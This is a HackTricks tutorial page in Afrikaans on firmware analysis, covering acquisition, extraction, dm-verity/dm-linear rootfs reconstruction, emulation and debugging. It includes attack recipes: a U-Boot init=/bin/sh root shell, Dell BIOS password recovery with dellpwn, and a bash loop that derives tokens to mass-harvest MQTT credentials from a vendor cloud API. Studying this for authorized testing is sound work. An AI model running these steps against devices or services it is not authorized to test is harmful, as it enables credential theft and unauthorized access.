# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante hulpbronne

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, sodat die toestel toegang tot noodsaaklike instruksies het sodra dit aangeskakel word, wat lei tot die bedryfstelsel se opstart. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Die insameling van inligting** is ’n kritieke eerste stap om die samestelling van ’n toestel en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel waarop dit loop
- Besonderhede oor die bootloader
- Hardeware-uitleg en datablaaie
- Metrieke oor die kodebasis en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsgoed van onskatbare waarde, asook die ontleding van enige beskikbare open-source sagtewarekomponente deur handmatige en geoutomatiseerde hersieningsprosesse. Nutsgoed soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om moontlike probleme te vind.

## **Verkryging van die firmware**

Firmware kan op verskeie maniere verkry word, elk met ’n eie kompleksiteitsvlak:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- Deur dit **te bou** volgens die verskafte instruksies
- Deur dit **af te laai** vanaf amptelike ondersteuningswebwerwe
- Deur **Google dork**-navrae te gebruik om gehoste firmwarelêers te vind
- Deur **cloud storage** direk te verkry met nutsgoed soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** via verbindings soos **UART**, **JTAG** of **PICit**
- Deur opdateringsversoeke in toestelkommunikasie te **snuffel**
- Deur **hardcoded opdateringseindpunte** te identifiseer en te gebruik
- Deur dit vanaf die bootloader of netwerk te **dump**
- Deur die stoorskyfie te **verwyder en uit te lees** wanneer niks anders werk nie, met toepaslike hardeware-nutsgoed

### Slegs UART-logboeke: forseer ’n root-shell via U-Boot-omgewingsveranderlikes in flash

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds ’n init-shell forseer deur die **U-Boot-omgewingsblob** vanlyn te **wysig**:<sup>[[6]](#references)</sup>

1. Dump SPI-flash met ’n SOIC-8-knippie en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Vind die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot env CRC32 vir die blob weer**.
3. Flash slegs die env-partisie weer en herlaai; ’n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die bootloader-shell gedeaktiveer is, maar die env-partisie via eksterne flash-toegang skryfbaar is.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskillende tools wat jy hiervoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsmiddels vind nie, kontroleer die **entropie** van die image met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie encrypted nie. As dit hoog is, is dit waarskynlik encrypted (of op een of ander manier compressed).

Verder kan jy hierdie nutsmiddels gebruik om **lêers wat in die firmware ingebed is** uit te haal:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Differensiële flash-analise en herstelbare XOR-geheimebergings

Wanneer ’n firmware-instelling geen gedokumenteerde stoorformaat het nie, neem eers verskeie ooreenstemmende flash-lesings, verander **presies een** instelling, dump die volledige chip weer en vergelyk die offsets. Deur die eksperiment met beheerde waardes te herhaal, kan jy die instelling van tellers en skryfmetadata onderskei; veranderinge by nuwe offsets eerder as in plek dui op ’n append-only of log-structured stoorplek. Behou geskrapte/tombstoned inskrywings, aangesien hul payload-grepe dalk steeds herstelbaar is.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nadat jy die streek opgespoor het, onttrek die firmware-modules met nutsmiddels soos `binwalk` en reverse-engineer die skrywer/validator in Ghidra. Bevestig veldgrense, padding, sleutelindeksering en sleutelafleiding in die kode, eerder as om die skema slegs uit ciphertext-patrone af te lei.<sup>[[12]](#references)</sup>

#### Herwin sleutels uit geënkripteerde nul-padding

Soos beskryf in [XOR-gebaseerde enkripsie](../../crypto/symmetric/#xor-based-encryption), onthul bekende plaintext keystream-grepe by dieselfde offsets. ’n Veld met ’n vaste grootte is besonder blootgestel wanneer sy nul-padding elke indeks van ’n herhalende XOR-sleutel dek: die geënkripteerde padding onthul daardie sleutelgrepe direk omdat `0x00 XOR key_byte = key_byte`. As elke sleutelindeks gedek word, rekonstrueer die sleutel uit die ciphertext-stert en dekripteer die ingevulde grepe.<sup>[[12]](#references)</sup>

Dell se kwesbare DVAR BIOS-wagwoordformaat is ’n konkrete voorbeeld: greep `0` van ’n 32-greep-veld is plaintext, terwyl grepe `1..31` ’n herhalende 20-greep-sleutel gebruik.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Vir ’n wagwoordlengte `L` was posisies `L..31` nul voor XOR. Wanneer `L <= 12`, dek daardie posisies elke sleutelindeks, sodat die volledige sleutel en wagwoord sonder brute force herwin word:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Haal sleutels uit historiese rekords

Moenie elke rekord afsonderlik ontleed nie. Die DVAR-sleutel word ongeveer afgelei as `modified_md5(device_seed || variable_GUID || password[0])`: die device seed en GUID is vas, en die enigste wagwoordafhanklike inset is die eerste byte in duidelike teks. Dit gee hoogstens 256 sleutels per toestel, en rekords wat met dieselfde byte begin, deel dus ’n sleutel. Groepeer aktiewe en geskrapte rekords volgens daardie byte; ’n kort historiese rekord kan die volle sleutel deur padding uitlek en ’n huidige, langer rekord dekripteer waarvan die eie padding onvoldoende is. Wagwoordrotasie kan blootstelling dus verhoog wanneer ou ciphertext getombstone word eerder as uitgevee word.<sup>[[12]](#references)</sup>

Die [`dellpwn`](https://github.com/R3n5k1/dellpwn)-instrument vind DVAR, valideer kandidaat-rekords, herwin wagwoorde en kan rou gestoorde/sleutelbytes vertoon. Bou dit vanaf ’n checkout en skandeer ’n geverifieerde flash-beeld soos volg:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Vir pasgemaakte parsers, verwerp vals positiewe resultate met behulp van rekordstruktuur, beperkings op drukbare karakters, kontroles vir nulopvulling, sleutelentropie en konsekwentheid waar die sleutel omvou. As herhaalde dumps yl biswisselings per skryfbewerking toon, lys die waargenome maskers en rangskik regstellings volgens hierdie beperkings, maar rapporteer dubbelsinnige karakters eerder as om heuristiese uitvoer as presiese herwinning voor te stel.<sup>[[12]](#references)</sup>

Wagwoordverifieerders moet ’n gesoute, herhaalde eenrigting-hash stoor eerder as omkeerbare syferteks, en loggestruktureerde stores moet verouderde geheime materiaal veilig verwyder.<sup>[[12]](#references)</sup>

### Kry die lêerstelsel

Met die voorheen genoemde nutsmiddels, soos `binwalk -ev <bin>`, behoort jy die lêerstelsel te kon **onttrek**.\
Binwalk onttrek dit gewoonlik binne ’n **lêergids met die naam van die lêerstelseltipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige onttrekking van die lêerstelsel

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy handtekeninge hê nie**. Gebruik in sulke gevalle binwalk om **die offset van die lêerstelsel te vind en die saamgeperste lêerstelsel uit die binêre lêer te carve**, en **onttrek** die lêerstelsel dan handmatig volgens die tipe daarvan deur die stappe hieronder te volg.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd-opdrag** uit om die Squashfs-lêerstelsel te carve.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Herbou van verdeelde ingebedde wortellêerstelsels

As ’n rou eMMC/SSD-dump ’n geldige lêerstelselkopskrif bevat, maar die metadata-afsets buite die nominale partisie strek, moet dit nie onmiddellik as korrup geklassifiseer word nie. Ingebedde selflaaikode kan die werklike worteltoestel uit verskeie fisiese reekse saamstel deur Device Mapper te gebruik; daarom lewer carving van een GPT-partisie slegs die eerste segment op.<sup>[[9]](#references)</sup>

#### Triage van die volledige media-beeld

Verifieer eers dat die verkryging voltooi is, die grootte stabiel is en geen skrywer die beeld nog oop hou nie. As die lêernaam ’n begin-/eindadres kodeer, vergelyk daardie reeks met die werklike aantal grepe. Herstel die GPT in leesalleenmodus en koppel slegs die vereiste reeks; moenie `vgchange -ay` teen ’n onbetroubare fisiese volume op die werkstasie uitvoer nie, aangesien volumegroepbotsings en onbedoelde skryfbewerkings moontlik is.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Gebruik verkieslik ’n weggooibare VM wanneer die oorspronklike init-logika of ’n LVM-stapel die hele image moet kan sien. Historiese boot logs van ’n standaard boot-partisie is besonder nuttig: die bootloader het dalk eiehouer-offsets, komponentlengtes, slotkeuse, belyningsreëls en handtekeningverifikasie aangeteken. Gebruik dié waardes om ’n ingebedde command line/kernel/initramfs uit te kerf, en valideer elke uitvoer afsonderlik met `file`, magic bytes en `binwalk`; as jy tot aan die einde van die houer lees, kan ’n initrd, ACPI-object of handtekening per ongeluk aan die kernel aangeheg word.<sup>[[9]](#references)</sup>

#### Herstel die blokkaart tydens opstart

Onttrek die kernel se initramfs en reverse sy `/init` plus enige bergingsbiblioteke. Volg in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) stringverwysings vir `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` en partisiepaaie; spoor dan die kode na wat die aktiewe A/B-slot kies en die tabel bou. Nuttige beginpunte in radare2 is `r2 -A init`, `afl`, `pdf @ main` en `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Die linear target karteer opeenvolgende reekse van ’n virtuele toestel na reekse op een of meer onderliggende toestelle. ’n Herwonne tabel met twee segmente het dikwels hierdie vorm (alle posisies en lengtes is 512-greep-sektore):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduseer die masjienkode-aritmetiek presies, insluitend heelgetalwydte, verskuiwings en eenheidsomskakelings. Byvoorbeeld, die volgende uitdrukking rond ’n grepegrootte af tot ’n 4-KiB-grens en skakel dit eers daarna om na 512-grepe-sektore; as jy dit met `p4_bytes // 512` vervang, verskuif die gekose stert met `p4_bytes % 4096` wanneer die partisie nie op ’n bladsygrens belyn is nie.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Herbou ’n plat ontledingsbeeld deur die reekse in tabelvolgorde met begrensde blokke te kopieer, eerder as om die volledige mediastorting in die geheue te laai. Dit vermy ook die skep van mapper-toestelle aan die gasheerkant. Hou die GPT-afgeleide offsets, omgekeerde sektortellings en gevolglike uitvoerlengte as afsonderlike stellings.<sup>[[9]](#references)</sup>

#### Onderskei korrupsie van ’n konstante rekonstruksiefout

Kontroleer vir SquashFS die `hsqs`-magic en dekodeer die little-endian 64-bis `bytes_used`-veld by superblock-offset 40 voordat jy `unsquashfs` laat loop. As ekstraksie in verskeie onverwante strukture misluk, soek ’n breë venster rondom die verwagte posisies en vereis sterk strukturele kandidate: ’n dekomprimeerbare metadata-blok, verskeie opeenvolgende geldige gidsinskrywings, geloofwaardige inode-velde, ’n wortelinode wat ooreenstem met die inode-telling, of ’n geldige integriteit-metadat struktuur. ’n Enkele magic-treffer is onvoldoende.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wanneer dieselfde getekende delta onafhanklike strukture geldig maak—byvoorbeeld gidsmetadata en ’n verity-rekord—is die waarskynlike oorsaak ’n sistematiese segmentbeginfout eerder as ontbrekende grepe. Gaan terug na die omgekeerde rekenwerk en soek na weggegooide reste, getekendheid, oorloop of sektor-/bladsyafronding voordat jy probeer om weesdata te herstel of lêerstelselmetadata reg te stel.<sup>[[9]](#references)</sup>

Hou laastens die beskermingsgrense apart: TPM-verseëlde LUKS-volumes beskerm datavertroulikheid, terwyl ’n getekende dm-verity-kartering die integriteit van die wortellêerstelsel beskerm. ’n Sagteware-TPM kan nie ’n sleutel herwin wat aan die oorspronklike fisiese TPM verseël is nie, en om ’n gewysigde SquashFS te selflaai deur ’n init wat slegs vir navorsing bedoel is en verity-verifikasie weglaat, vervals nie die handtekening daarvan of breek dm-verity nie.<sup>[[9]](#references)</sup>

## Ontleding van firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en potensiële kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsgoed om waardevolle data uit die firmwarebeeld te ontleed en te onttrek.

### Aanvanklike ontledingsnutsgoed

’n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (waarna verwys word as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die partisie- en lêerstelselbesonderhede te verstaan:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die image te bepaal, word die **entropy** met `binwalk -E <bin>` nagegaan. Lae entropy dui op ’n gebrek aan enkripsie, terwyl hoë entropy op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **embedded files** word nutsmiddels en hulpbronne soos die dokumentasie **file-data-carving-recovery-tools** en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe herken nie omdat magic bytes ontbreek, is handmatige onttrekking nodig. Dit behels dat `binwalk` gebruik word om die lêerstelsel se offset te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te kerf:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig te onttrek, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel onttrek is, begin die soektog na sekuriteitsfoute. Daar word aandag gegee aan onveilige netwerkdaemone, hardgekodeerde geloofsbriewe, API-eindpunte, opdateringsbedienerfunksionaliteit, ongekompileerde kode, opstarts skrifte en saamgestelde binaries vir vanlyn ontleding.

**Belangrike liggings** en **items** om te ondersoek, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en skriflêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binaries

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede binne die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om na sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op saamgestelde binaries

Beide bronkode en saamgestelde binaries wat in die lêerstelsel gevind word, moet noukeurig vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Oes van cloud-konfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie by ’n cloud-eindpunt af wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy vind dat `<token>` plaaslik van die toestel-ID afgelei word deur ’n hardgekodeerde geheim te gebruik, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY ken, in staat om die URL te rekonstrueer en die cloud-konfigurasie af te laai, wat dikwels leesbare MQTT-geloofsbriewe en topic-voorvoegsels openbaar.

Praktiese werkvloei:

1) Onttrek deviceId uit UART-opstartlogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) en neem logboeke op:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die cloud config-URL-patroon en broker-adres afdruk, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config path ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en skryf die digest met hoofletters:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Versamel cloud config en MQTT-aanmeldbesonderhede

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime te onttrek:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic-ACL's (indien teenwoordig)

- Gebruik herwinne geloofsbriewe om op maintenance-topics in te teken en na sensitiewe gebeurtenisse te soek:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumereer voorspelbare toestel-ID's (op skaal, met magtiging)

- Baie ekosisteme bevat verkoper-OUI-/produk-/tipegrepe gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's itereer, tokens aflei en konfigurasies programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Verkry altyd eksplisiete toestemming voordat jy mass enumeration probeer.
- Verkies emulation of static analysis om geheime te herwin sonder om teikenhardeware te wysig, waar moontlik.

Die proses om firmware te emuleer, maak **dynamic analysis** van óf ’n toestel se werking óf ’n individuele program moontlik. Hierdie benadering kan uitdagings weens hardeware- of argitektuurafhanklikhede teëkom, maar die oordrag van die root filesystem of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Individuele Binaries emuleer

Wanneer enkele programme ondersoek word, is dit noodsaaklik om die program se endianness en CPU-argitektuur te identifiseer.

#### Voorbeeld met MIPS-argitektuur

Om ’n binary met MIPS-argitektuur te emuleer, kan die volgende opdrag gebruik word:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binaries is `qemu-mipsel` die gepaste keuse.

#### Emulasie van ARM-argitektuur

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volledige stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander maak volledige firmware-emulasie moontlik, outomatiseer die proses en help met dinamiese analise.

### Heropbou van verdeelde en geverifieerde wortellêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar inode-, gids- of fragmenttabel-afsetwaardes onmoontlik is, moet jy nie dadelik `unsquashfs` regmaak nie. Keer die vroeë selflaaibinêre lêer om en herskep die bloktoestelgrafiek wat dit skep: ingebedde stelsels kan ’n nominale wortelpartisie blootlê, maar die werklike lêerstelsel bou met ’n `dm-linear`-kartering wat sektore wat by ’n ander partisie geleen is, byvoeg. Kontroles wat net die superblok nagaan, kan slaag selfs wanneer elke latere metadata-blok verskuif is.<sup>[[11]](#references)</sup>

Behoud die firmware se rekenkunde presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye uitgedruk word; herskep verskuiwings en afkapping in hul oorspronklike volgorde; en verreken bankafhanklike stertstreke in A/B-uitlegte. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat dan as 512-greep-sektore uit; as jy dit met `partition_bytes // 512` vervang, kan die bygevoegde omvang met ’n paar kilogrepe verskuif en al die daaropvolgende SquashFS-tabelle beskadig.<sup>[[11]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[11]](#references)</sup>

1. Herwin elke `dm-linear`-segment se brontoestel, beginsektor en lengte uit die verifier-/init-binary.
2. Koppel of karteer die omvangs sonder om hul belyningssemantiek te verander.
3. As onttrekking steeds misluk, soek slegs in ’n klein venster om die voorspelde grens en vereis verskeie opeenvolgende geldige metadat strukture, eerder as om net ’n geloofwaardige superblok te aanvaar.
4. Voer ’n onveranderde `unsquashfs` teen die herskepte beeld uit; suksesvolle deurloop van alle gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Vervanging van dm-verity onder beheer van die ontleder

Wanneer die ontleder beheer het oor die QEMU-kernel, initramfs en virtuele skywe, kan ’n gewysigde wortel selflaai deur die verskaffer se verifikasie-PID 1 met ’n klein staties gekoppelde init te vervang. Dit is ’n **lab-selflaaikettingvervanging**, nie ’n verbreking van dm-verity, sy RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[11]](#references)</sup>

Die vervangings-init behoort die operasionele dele van die oorspronklike selflaaipad na te boots: monteer `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywers 0–2, monteer `/proc` en `/sys`, wag vir die verskafde bloktoestel, monteer die gewysigde wortel leesalleen, ontkoppel die pseudo-lêerstelsels van die ou wortel, skuif die nuwe montering na `/`, voer `chroot` uit en roep die firmware se oorspronklike `/sbin/init` met `execve()` aan. Deur `/dev`, `/proc` en `/sys` te ontkoppel **voor** `MS_MOVE`, voorkom jy dat monteringspunte wat aan die nuwe wortel behoort per ongeluk ontkoppel word.<sup>[[11]](#references)</sup>

Hou veranderlike toesteltoestand apart van die gewysigde onveranderlike wortel. ’n qcow2-oorleg kan die oorspronklike skyf se LVM-toestand behou, terwyl ’n tweede leesalleen virtio-skyf die gewysigde SquashFS verskaf:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Ontfouting van vanlyn beeldtoestand

Ondersoek persistente toestand buite die guest wanneer stadige opstart, vernietigende opstartskripte of onbetroubare konsole-logging die fout verdoesel. Moet nooit ’n overlay koppel wat deur ’n lopende VM gebruik word nie; stel dit bloot met `qemu-nbd`, beperk LVM-ontdekking tot die bedoelde NBD-partisie en deaktiveer die volumegroep voordat jy dit ontkoppel.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolasie, skryf tydgestempelde merkerlêers na ’n stabiele skryfbare volume en verifieer hulle vanlyn; `/dev/kmsg`, FIFOs en tydelike konsoles kan vals negatiewe oplewer weens koersbeperking of vroeë prosesbeëindiging. Vergelyk ook presiese koppelvlakke oor lae heen voordat jy onverwante kode verander: `uname -r` teenoor `/lib/modules/`, ext4-kenmerke op skyf teenoor kernkonfigurasie, en die Mesa `libGL`-generasie teenoor die DRI-bestuurder-ABI en PCI-afgeleide bestuurdername. ’n Komponent kan bestaan en selfs suksesvol `dlopen()` uitvoer, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[11]](#references)</sup>

## Dinamiese analise in die praktyk

Op hierdie stadium word ’n werklike of geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots hardeware-interaksies dalk nie perfek na nie, wat soms herbeginsels van die emulasie vereis. Analise behoort die lêerstelsel weer te ondersoek, blootgestelde webblaaie en netwerkdienste te exploit, en kwesbaarhede in die bootloader te verken. Firmware-integriteitstoetse is noodsaaklik om moontlike agterdeurkwesbaarhede te identifiseer.

## Tegnieke vir runtime-analise

Runtime-analise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing, met nutsprogramme soos gdb-multiarch, Frida en Ghidra om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige ontfouter, **kopieer ’n staties gekoppelde `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
